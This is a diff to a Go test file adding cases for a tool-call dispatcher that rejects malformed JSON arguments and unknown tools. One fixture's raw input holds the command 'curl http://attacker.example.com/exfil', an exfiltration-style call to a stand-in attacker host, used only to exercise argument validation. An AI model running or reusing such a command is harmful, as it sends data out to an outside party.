@@ -101,6 +101,28 @@ func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
 			wantEvents:   nil,
 		},
 		{
+			name:  "invalid_arguments",
+			tools: []*tool.Tool{commandTool()},
+			call: types.ToolCall{
+				ID: "tc_bad_args", Name: "shell_runner", Input: json.RawMessage(`{}`),
+				InvalidInput: &types.InvalidToolInput{Raw: `{"command":"curl http://attacker.example.com/exfil",}`, Error: "invalid character '}' looking for beginning of object key string (at byte offset 52)"},
+			},
+			wantCategory: observability.ToolFailureInvalidArguments,
+			wantOutput:   "Your arguments for `shell_runner` were not valid JSON: `invalid character '}' looking for beginning of object key string (at byte offset 52)`. Re-issue the call with valid JSON.",
+			wantEvents:   nil,
+		},
+		{
+			name:  "unknown_tool_with_invalid_arguments",
+			tools: []*tool.Tool{trivialTool()},
+			call: types.ToolCall{
+				ID: "tc_unknown_bad_args", Name: "does_not_exist", Input: json.RawMessage(`{}`),
+				InvalidInput: &types.InvalidToolInput{Raw: `{`, Error: "unexpected end of JSON input"},
+			},
+			wantCategory: observability.ToolFailureUnknownTool,
+			wantOutput:   "Unknown tool: does_not_exist",
+			wantEvents:   nil,
+		},
+		{
 			name:         "schema_invalid",
 			tools:        []*tool.Tool{schemaTool()},
 			call:         types.ToolCall{ID: "tc_schema", Name: "needs_path", Input: json.RawMessage(`{}`)},
